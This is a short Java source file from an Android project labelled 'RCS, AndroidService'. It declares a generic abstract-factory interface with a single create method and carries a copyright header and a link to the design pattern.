/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AbstractFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.interfaces;

/**
 * http://en.wikipedia.org/wiki/Abstract_factory_pattern
 *
 * @param <T1>
 * @param <T2>
 * @author zeno
 */
public interface AbstractFactory<T1, T2> {
	public T1 create(T2 params, String subtype);
}
